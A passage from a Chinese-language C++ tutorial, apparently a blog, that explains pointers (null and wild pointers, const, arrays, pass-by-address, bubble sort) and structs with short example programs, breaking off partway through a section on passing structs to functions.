<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//1、指针的定义</span></span><br><span class="line">	<span class="type">int</span> a = <span class="number">10</span>; <span class="comment">//定义整型变量a</span></span><br><span class="line">	</span><br><span class="line">	<span class="comment">//指针定义语法： 数据类型 * 变量名 ;</span></span><br><span class="line">	<span class="type">int</span> * p;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//指针变量赋值</span></span><br><span class="line">	p = &amp;a; <span class="comment">//指针指向变量a的地址</span></span><br><span class="line">	cout &lt;&lt; &amp;a &lt;&lt; endl; <span class="comment">//打印数据a的地址</span></span><br><span class="line">	cout &lt;&lt; p &lt;&lt; endl;  <span class="comment">//打印指针变量p</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">//2、指针的使用</span></span><br><span class="line">	<span class="comment">//通过*操作指针变量指向的内存</span></span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;*p = &quot;</span> &lt;&lt; *p &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>



<p>指针变量和普通变量的区别</p>
<ul>
<li>普通变量存放的是数据,指针变量存放的是地址</li>
<li>指针变量可以通过” * “操作符，操作指针变量指向的内存空间，这个过程称为解引用</li>
</ul>
<blockquote>
<p>总结1： 我们可以通过 &amp; 符号 获取变量的地址</p>
</blockquote>
<blockquote>
<p>总结2：利用指针可以记录地址</p>
</blockquote>
<blockquote>
<p>总结3：对指针变量解引用，可以操作指针指向的内存</p>
</blockquote>
<h3 id="7-3-指针所占内存空间"><a href="#7-3-指针所占内存空间" class="headerlink" title="7.3 指针所占内存空间"></a>7.3 指针所占内存空间</h3><p>提问：指针也是种数据类型，那么这种数据类型占用多少内存空间？</p>
<p><strong>示例：</strong></p>
<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="type">int</span> a = <span class="number">10</span>;</span><br><span class="line"></span><br><span class="line">	<span class="type">int</span> * p;</span><br><span class="line">	p = &amp;a; <span class="comment">//指针指向数据a的地址</span></span><br><span class="line"></span><br><span class="line">	cout &lt;&lt; *p &lt;&lt; endl; <span class="comment">//* 解引用</span></span><br><span class="line">	cout &lt;&lt; <span class="built_in">sizeof</span>(p) &lt;&lt; endl;</span><br><span class="line">	cout &lt;&lt; <span class="built_in">sizeof</span>(<span class="type">char</span> *) &lt;&lt; endl;</span><br><span class="line">	cout &lt;&lt; <span class="built_in">sizeof</span>(<span class="type">float</span> *) &lt;&lt; endl;</span><br><span class="line">	cout &lt;&lt; <span class="built_in">sizeof</span>(<span class="type">double</span> *) &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>



<blockquote>
<p>总结：所有指针类型在32位操作系统下是4个字节</p>
</blockquote>
<h3 id="7-4-空指针和野指针"><a href="#7-4-空指针和野指针" class="headerlink" title="7.4 空指针和野指针"></a>7.4 空指针和野指针</h3><p><strong>空指针</strong>：指针变量指向内存中编号为0的空间</p>
<p><strong>用途：</strong>初始化指针变量</p>
<p><strong>注意：</strong>空指针指向的内存是不可以访问的</p>
<p><strong>示例1：空指针</strong></p>
<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//指针变量p指向内存地址编号为0的空间</span></span><br><span class="line">	<span class="type">int</span> * p = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//访问空指针报错 </span></span><br><span class="line">	<span class="comment">//内存编号0 ~255为系统占用内存，不允许用户访问</span></span><br><span class="line">	cout &lt;&lt; *p &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>















<p><strong>野指针</strong>：指针变量指向非法的内存空间</p>
<p><strong>示例2：野指针</strong></p>
<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//指针变量p指向内存地址编号为0x1100的空间</span></span><br><span class="line">	<span class="type">int</span> * p = (<span class="type">int</span> *)<span class="number">0x1100</span>;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//访问野指针报错 </span></span><br><span class="line">	cout &lt;&lt; *p &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>





<blockquote>
<p>总结：空指针和野指针都不是我们申请的空间，因此不要访问。</p>
</blockquote>
<h3 id="7-5-const修饰指针"><a href="#7-5-const修饰指针" class="headerlink" title="7.5 const修饰指针"></a>7.5 const修饰指针</h3><p>const修饰指针有三种情况</p>
<ol>
<li>const修饰指针   — 常量指针</li>
<li>const修饰常量   — 指针常量</li>
<li>const即修饰指针，又修饰常量</li>
</ol>
<p><strong>示例：</strong></p>
<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="type">int</span> a = <span class="number">10</span>;</span><br><span class="line">	<span class="type">int</span> b = <span class="number">10</span>;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//const修饰的是指针，指针指向可以改，指针指向的值不可以更改</span></span><br><span class="line">	<span class="type">const</span> <span class="type">int</span> * p1 = &amp;a; </span><br><span class="line">	p1 = &amp;b; <span class="comment">//正确</span></span><br><span class="line">	<span class="comment">//*p1 = 100;  报错</span></span><br><span class="line">	</span><br><span class="line"></span><br><span class="line">	<span class="comment">//const修饰的是常量，指针指向不可以改，指针指向的值可以更改</span></span><br><span class="line">	<span class="type">int</span> * <span class="type">const</span> p2 = &amp;a;</span><br><span class="line">	<span class="comment">//p2 = &amp;b; //错误</span></span><br><span class="line">	*p2 = <span class="number">100</span>; <span class="comment">//正确</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//const既修饰指针又修饰常量</span></span><br><span class="line">	<span class="type">const</span> <span class="type">int</span> * <span class="type">const</span> p3 = &amp;a;</span><br><span class="line">	<span class="comment">//p3 = &amp;b; //错误</span></span><br><span class="line">	<span class="comment">//*p3 = 100; //错误</span></span><br><span class="line"></span><br><span class="line">	<span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>



<blockquote>
<p>技巧：看const右侧紧跟着的是指针还是常量, 是指针就是常量指针，是常量就是指针常量</p>
</blockquote>
<h3 id="7-6-指针和数组"><a href="#7-6-指针和数组" class="headerlink" title="7.6 指针和数组"></a>7.6 指针和数组</h3><p><strong>作用：</strong>利用指针访问数组中元素</p>
<p><strong>示例：</strong></p>
<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="type">int</span> arr[] = &#123; <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>,<span class="number">10</span> &#125;;</span><br><span class="line"></span><br><span class="line">	<span class="type">int</span> * p = arr;  <span class="comment">//指向数组的指针</span></span><br><span class="line"></span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;第一个元素： &quot;</span> &lt;&lt; arr[<span class="number">0</span>] &lt;&lt; endl;</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;指针访问第一个元素： &quot;</span> &lt;&lt; *p &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="comment">//利用指针遍历数组</span></span><br><span class="line">		cout &lt;&lt; *p &lt;&lt; endl;</span><br><span class="line">		p++;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>











<h3 id="7-7-指针和函数"><a href="#7-7-指针和函数" class="headerlink" title="7.7 指针和函数"></a>7.7 指针和函数</h3><p><strong>作用：</strong>利用指针作函数参数，可以修改实参的值</p>
<p><strong>示例：</strong></p>
<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">//值传递</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">swap1</span><span class="params">(<span class="type">int</span> a ,<span class="type">int</span> b)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="type">int</span> temp = a;</span><br><span class="line">	a = b; </span><br><span class="line">	b = temp;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//地址传递</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">swap2</span><span class="params">(<span class="type">int</span> * p1, <span class="type">int</span> *p2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="type">int</span> temp = *p1;</span><br><span class="line">	*p1 = *p2;</span><br><span class="line">	*p2 = temp;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="type">int</span> a = <span class="number">10</span>;</span><br><span class="line">	<span class="type">int</span> b = <span class="number">20</span>;</span><br><span class="line">	<span class="built_in">swap1</span>(a, b); <span class="comment">// 值传递不会改变实参</span></span><br><span class="line"></span><br><span class="line">	<span class="built_in">swap2</span>(&amp;a, &amp;b); <span class="comment">//地址传递会改变实参</span></span><br><span class="line"></span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;a = &quot;</span> &lt;&lt; a &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;b = &quot;</span> &lt;&lt; b &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>



<blockquote>
<p>总结：如果不想修改实参，就用值传递，如果想修改实参，就用地址传递</p>
</blockquote>
<h3 id="7-8-指针、数组、函数"><a href="#7-8-指针、数组、函数" class="headerlink" title="7.8 指针、数组、函数"></a>7.8 指针、数组、函数</h3><p><strong>案例描述：</strong>封装一个函数，利用冒泡排序，实现对整型数组的升序排序</p>
<p>例如数组：int arr[10] &#x3D; { 4,3,6,9,1,2,10,8,7,5 };</p>
<p><strong>示例：</strong></p>
<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">//冒泡排序函数</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">bubbleSort</span><span class="params">(<span class="type">int</span> * arr, <span class="type">int</span> len)</span>  <span class="comment">//int * arr 也可以写为int arr[]</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; len - <span class="number">1</span>; i++)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; len - <span class="number">1</span> - i; j++)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">if</span> (arr[j] &gt; arr[j + <span class="number">1</span>])</span><br><span class="line">			&#123;</span><br><span class="line">				<span class="type">int</span> temp = arr[j];</span><br><span class="line">				arr[j] = arr[j + <span class="number">1</span>];</span><br><span class="line">				arr[j + <span class="number">1</span>] = temp;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//打印数组函数</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">printArray</span><span class="params">(<span class="type">int</span> arr[], <span class="type">int</span> len)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; len; i++)</span><br><span class="line">	&#123;</span><br><span class="line">		cout &lt;&lt; arr[i] &lt;&lt; endl;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="type">int</span> arr[<span class="number">10</span>] = &#123; <span class="number">4</span>,<span class="number">3</span>,<span class="number">6</span>,<span class="number">9</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">10</span>,<span class="number">8</span>,<span class="number">7</span>,<span class="number">5</span> &#125;;</span><br><span class="line">	<span class="type">int</span> len = <span class="built_in">sizeof</span>(arr) / <span class="built_in">sizeof</span>(<span class="type">int</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">bubbleSort</span>(arr, len);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printArray</span>(arr, len);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>



<blockquote>
<p>总结：当数组名传入到函数作为参数时，被退化为指向首元素的指针</p>
</blockquote>
<h2 id="8-结构体"><a href="#8-结构体" class="headerlink" title="8 结构体"></a>8 结构体</h2><h3 id="8-1-结构体基本概念"><a href="#8-1-结构体基本概念" class="headerlink" title="8.1 结构体基本概念"></a>8.1 结构体基本概念</h3><p>结构体属于用户&#x3D;&#x3D;自定义的数据类型&#x3D;&#x3D;，允许用户存储不同的数据类型</p>
<h3 id="8-2-结构体定义和使用"><a href="#8-2-结构体定义和使用" class="headerlink" title="8.2 结构体定义和使用"></a>8.2 结构体定义和使用</h3><p><strong>语法：</strong><code>struct 结构体名 &#123; 结构体成员列表 &#125;；</code></p>
<p>通过结构体创建变量的方式有三种：</p>
<ul>
<li>struct 结构体名 变量名</li>
<li>struct 结构体名 变量名 &#x3D; { 成员1值 ， 成员2值…}</li>
<li>定义结构体时顺便创建变量</li>
</ul>
<p><strong>示例：</strong></p>
<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">//结构体定义</span></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">student</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="comment">//成员列表</span></span><br><span class="line">	string name;  <span class="comment">//姓名</span></span><br><span class="line">	<span class="type">int</span> age;      <span class="comment">//年龄</span></span><br><span class="line">	<span class="type">int</span> score;    <span class="comment">//分数</span></span><br><span class="line">&#125;stu3; <span class="comment">//结构体变量创建方式3 </span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//结构体变量创建方式1</span></span><br><span class="line">	<span class="keyword">struct</span> <span class="title class_">student</span> stu1; <span class="comment">//struct 关键字可以省略</span></span><br><span class="line"></span><br><span class="line">	stu<span class="number">1.</span>name = <span class="string">&quot;张三&quot;</span>;</span><br><span class="line">	stu<span class="number">1.</span>age = <span class="number">18</span>;</span><br><span class="line">	stu<span class="number">1.</span>score = <span class="number">100</span>;</span><br><span class="line">	</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;姓名：&quot;</span> &lt;&lt; stu<span class="number">1.</span>name &lt;&lt; <span class="string">&quot; 年龄：&quot;</span> &lt;&lt; stu<span class="number">1.</span>age  &lt;&lt; <span class="string">&quot; 分数：&quot;</span> &lt;&lt; stu<span class="number">1.</span>score &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//结构体变量创建方式2</span></span><br><span class="line">	<span class="keyword">struct</span> <span class="title class_">student</span> stu2 = &#123; <span class="string">&quot;李四&quot;</span>,<span class="number">19</span>,<span class="number">60</span> &#125;;</span><br><span class="line"></span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;姓名：&quot;</span> &lt;&lt; stu<span class="number">2.</span>name &lt;&lt; <span class="string">&quot; 年龄：&quot;</span> &lt;&lt; stu<span class="number">2.</span>age  &lt;&lt; <span class="string">&quot; 分数：&quot;</span> &lt;&lt; stu<span class="number">2.</span>score &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	stu<span class="number">3.</span>name = <span class="string">&quot;王五&quot;</span>;</span><br><span class="line">	stu<span class="number">3.</span>age = <span class="number">18</span>;</span><br><span class="line">	stu<span class="number">3.</span>score = <span class="number">80</span>;</span><br><span class="line">	</span><br><span class="line"></span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;姓名：&quot;</span> &lt;&lt; stu<span class="number">3.</span>name &lt;&lt; <span class="string">&quot; 年龄：&quot;</span> &lt;&lt; stu<span class="number">3.</span>age  &lt;&lt; <span class="string">&quot; 分数：&quot;</span> &lt;&lt; stu<span class="number">3.</span>score &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>



<blockquote>
<p>总结1：定义结构体时的关键字是struct，不可省略</p>
</blockquote>
<blockquote>
<p>总结2：创建结构体变量时，关键字struct可以省略</p>
</blockquote>
<blockquote>
<p>总结3：结构体变量利用操作符 ‘’.’’  访问成员</p>
</blockquote>
<h3 id="8-3-结构体数组"><a href="#8-3-结构体数组" class="headerlink" title="8.3 结构体数组"></a>8.3 结构体数组</h3><p><strong>作用：</strong>将自定义的结构体放入到数组中方便维护</p>
<p><strong>语法：</strong><code> struct  结构体名 数组名[元素个数] = &#123;  &#123;&#125; , &#123;&#125; , ... &#123;&#125; &#125;</code></p>
<p><strong>示例：</strong></p>
<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">//结构体定义</span></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">student</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="comment">//成员列表</span></span><br><span class="line">	string name;  <span class="comment">//姓名</span></span><br><span class="line">	<span class="type">int</span> age;      <span class="comment">//年龄</span></span><br><span class="line">	<span class="type">int</span> score;    <span class="comment">//分数</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	</span><br><span class="line">	<span class="comment">//结构体数组</span></span><br><span class="line">	<span class="keyword">struct</span> <span class="title class_">student</span> arr[<span class="number">3</span>]=</span><br><span class="line">	&#123;</span><br><span class="line">		&#123;<span class="string">&quot;张三&quot;</span>,<span class="number">18</span>,<span class="number">80</span> &#125;,</span><br><span class="line">		&#123;<span class="string">&quot;李四&quot;</span>,<span class="number">19</span>,<span class="number">60</span> &#125;,</span><br><span class="line">		&#123;<span class="string">&quot;王五&quot;</span>,<span class="number">20</span>,<span class="number">70</span> &#125;</span><br><span class="line">	&#125;;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">3</span>; i++)</span><br><span class="line">	&#123;</span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;姓名：&quot;</span> &lt;&lt; arr[i].name &lt;&lt; <span class="string">&quot; 年龄：&quot;</span> &lt;&lt; arr[i].age &lt;&lt; <span class="string">&quot; 分数：&quot;</span> &lt;&lt; arr[i].score &lt;&lt; endl;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>











<h3 id="8-4-结构体指针"><a href="#8-4-结构体指针" class="headerlink" title="8.4 结构体指针"></a>8.4 结构体指针</h3><p><strong>作用：</strong>通过指针访问结构体中的成员</p>
<ul>
<li>利用操作符 <code>-&gt; </code>可以通过结构体指针访问结构体属性</li>
</ul>
<p><strong>示例：</strong></p>
<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">//结构体定义</span></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">student</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="comment">//成员列表</span></span><br><span class="line">	string name;  <span class="comment">//姓名</span></span><br><span class="line">	<span class="type">int</span> age;      <span class="comment">//年龄</span></span><br><span class="line">	<span class="type">int</span> score;    <span class="comment">//分数</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">struct</span> <span class="title class_">student</span> stu = &#123; <span class="string">&quot;张三&quot;</span>,<span class="number">18</span>,<span class="number">100</span>, &#125;;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">struct</span> <span class="title class_">student</span> * p = &amp;stu;</span><br><span class="line">	</span><br><span class="line">	p-&gt;score = <span class="number">80</span>; <span class="comment">//指针通过 -&gt; 操作符可以访问成员</span></span><br><span class="line"></span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;姓名：&quot;</span> &lt;&lt; p-&gt;name &lt;&lt; <span class="string">&quot; 年龄：&quot;</span> &lt;&lt; p-&gt;age &lt;&lt; <span class="string">&quot; 分数：&quot;</span> &lt;&lt; p-&gt;score &lt;&lt; endl;</span><br><span class="line">	</span><br><span class="line">	<span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>



<blockquote>
<p>总结：结构体指针可以通过 -&gt; 操作符 来访问结构体中的成员</p>
</blockquote>
<h3 id="8-5-结构体嵌套结构体"><a href="#8-5-结构体嵌套结构体" class="headerlink" title="8.5 结构体嵌套结构体"></a>8.5 结构体嵌套结构体</h3><p><strong>作用：</strong> 结构体中的成员可以是另一个结构体</p>
<p><strong>例如：</strong>每个老师辅导一个学员，一个老师的结构体中，记录一个学生的结构体</p>
<p><strong>示例：</strong></p>
<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">//学生结构体定义</span></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">student</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="comment">//成员列表</span></span><br><span class="line">	string name;  <span class="comment">//姓名</span></span><br><span class="line">	<span class="type">int</span> age;      <span class="comment">//年龄</span></span><br><span class="line">	<span class="type">int</span> score;    <span class="comment">//分数</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">//教师结构体定义</span></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">teacher</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">//成员列表</span></span><br><span class="line">	<span class="type">int</span> id; <span class="comment">//职工编号</span></span><br><span class="line">	string name;  <span class="comment">//教师姓名</span></span><br><span class="line">	<span class="type">int</span> age;   <span class="comment">//教师年龄</span></span><br><span class="line">	<span class="keyword">struct</span> <span class="title class_">student</span> stu; <span class="comment">//子结构体 学生</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">struct</span> <span class="title class_">teacher</span> t1;</span><br><span class="line">	t<span class="number">1.</span>id = <span class="number">10000</span>;</span><br><span class="line">	t<span class="number">1.</span>name = <span class="string">&quot;老王&quot;</span>;</span><br><span class="line">	t<span class="number">1.</span>age = <span class="number">40</span>;</span><br><span class="line"></span><br><span class="line">	t<span class="number">1.</span>stu.name = <span class="string">&quot;张三&quot;</span>;</span><br><span class="line">	t<span class="number">1.</span>stu.age = <span class="number">18</span>;</span><br><span class="line">	t<span class="number">1.</span>stu.score = <span class="number">100</span>;</span><br><span class="line"></span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;教师 职工编号： &quot;</span> &lt;&lt; t<span class="number">1.</span>id &lt;&lt; <span class="string">&quot; 姓名： &quot;</span> &lt;&lt; t<span class="number">1.</span>name &lt;&lt; <span class="string">&quot; 年龄： &quot;</span> &lt;&lt; t<span class="number">1.</span>age &lt;&lt; endl;</span><br><span class="line">	</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;辅导学员 姓名： &quot;</span> &lt;&lt; t<span class="number">1.</span>stu.name &lt;&lt; <span class="string">&quot; 年龄：&quot;</span> &lt;&lt; t<span class="number">1.</span>stu.age &lt;&lt; <span class="string">&quot; 考试分数： &quot;</span> &lt;&lt; t<span class="number">1.</span>stu.score &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>



<p><strong>总结：</strong>在结构体中可以定义另一个结构体作为成员，用来解决实际问题</p>
<h3 id="8-6-结构体做函数参数"><a href="#8-6-结构体做函数参数" class="headerlink" title="8.6 结构体做函数参数"></a>8.6 结构体做函数参数</h3><p><strong>作用：</strong>将结构体作为参数向函数中传递</p>
<p>传递方式有两种：</p>
<ul>
<li>值传递</li>
<li>地址传递</li>
</ul>
<p><strong>示例：</strong></p>
<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">//学生结构体定义</span></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">student</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="comment">//成员列表</span></span><br><span class="line">	string name;  <span class="comment">//姓名</span></span><br><span class="line">	<span class="type">int</span> age;      <span class="comment">//年龄</span></span><br><span class="line">	<span class="type">int</span> score;    <span class="comment">//分数</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">//值传递</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">printStudent</span><span class="params">(student stu )</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	stu.age = <span class="number">28</span>;</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;子函数中 姓名：&quot;</span> &lt;&lt; stu.name &lt;&lt; <span class="string">&quot; 年龄： &quot;</span> &lt;&lt; stu.age  &lt;&lt; <span class="string">&quot; 分数：&quot;</span> &lt;&lt; stu.score &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//地址传递</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">printStudent2</span><span class="params">(student *stu)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	stu-&gt;age = <span class="number">28</span>;</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;子函数中 姓名：&quot;</span> &lt;&lt; stu-&gt;name &lt;&lt; <span class="string">&quot; 年龄： &quot;</span> &lt;&lt; stu-&gt;age  &lt;&lt; <span class="string">&quot; 分数：&quot;</span> &lt;&lt; stu-&gt;score &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	student stu = &#123; <span class="string">&quot;张三&quot;</span>,<span class="number">18</span>,<span class="number">100</span>&#125;;</span><br><span class="line">	<span class="comment">//值传递</span></span><br><span class="line">	<span class="built_in">printStudent</span>(stu);</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;主函数中 姓名：&quot;</span> &lt;&lt; stu.name &lt;&lt; <span class="string">&quot; 年龄： &quot;</span> &lt;&lt; stu.age 